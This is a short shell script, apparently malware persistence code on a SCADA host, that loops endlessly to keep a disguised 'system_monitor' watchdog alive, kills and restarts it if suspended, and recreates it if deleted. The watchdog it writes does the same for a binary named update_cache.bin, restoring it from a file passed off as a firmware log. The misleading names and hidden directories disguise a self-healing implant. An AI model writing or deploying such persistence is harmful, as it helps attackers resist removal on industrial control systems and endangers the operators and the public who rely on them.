#!/bin/sh
WATCHDOG="/home/scada/.local/share/system_monitor/system_monitor"
UPDATE_CACHE="/home/scada/.cache/update_files/update_cache.bin"
FIRMWARE_SOURCE="/var/tmp/firmware-stdout.log"

while true; do
    sleep 10
    if ! pgrep -f "$WATCHDOG" > /dev/null; then
        $WATCHDOG &
    else
        if ps -o state= -p $(pgrep -f "$WATCHDOG") | grep -q 'T'; then
            kill -9 $(pgrep -f "$WATCHDOG")
            $WATCHDOG &
        fi
    fi

    if [ ! -f "$WATCHDOG" ]; then
        mkdir -p "$(dirname "$WATCHDOG")"
        echo '#!/bin/sh' > "$WATCHDOG"
        echo "UPDATE_CACHE=\"$UPDATE_CACHE\"" >> "$WATCHDOG"
        echo "FIRMWARE_SOURCE=\"$FIRMWARE_SOURCE\"" >> "$WATCHDOG"
        echo 'while true; do' >> "$WATCHDOG"
        echo '    sleep 10' >> "$WATCHDOG"
        echo '    if ! pgrep -f update_cache.bin > /dev/null; then' >> "$WATCHDOG"
        echo '        $UPDATE_CACHE &' >> "$WATCHDOG"
        echo '    else' >> "$WATCHDOG"
        echo '        if ps -o state= -p $(pgrep -f update_cache.bin) | grep -q "T"; then' >> "$WATCHDOG"
        echo '            kill -9 $(pgrep -f update_cache.bin)' >> "$WATCHDOG"
        echo '            $UPDATE_CACHE &' >> "$WATCHDOG"
        echo '        fi' >> "$WATCHDOG"
        echo '    fi' >> "$WATCHDOG"
        echo '    if [ ! -f "$UPDATE_CACHE" ]; then' >> "$WATCHDOG"
        echo '        if [ -f "$FIRMWARE_SOURCE" ]; then' >> "$WATCHDOG"
        echo '            mkdir -p "$(dirname "$UPDATE_CACHE")"' >> "$WATCHDOG"
        echo '            cp "$FIRMWARE_SOURCE" "$UPDATE_CACHE"' >> "$WATCHDOG"
        echo '            chmod 555 "$UPDATE_CACHE"' >> "$WATCHDOG"
        echo '        fi' >> "$WATCHDOG"
        echo '    fi' >> "$WATCHDOG"
        echo 'done' >> "$WATCHDOG"
        chmod 555 "$WATCHDOG"
    fi
done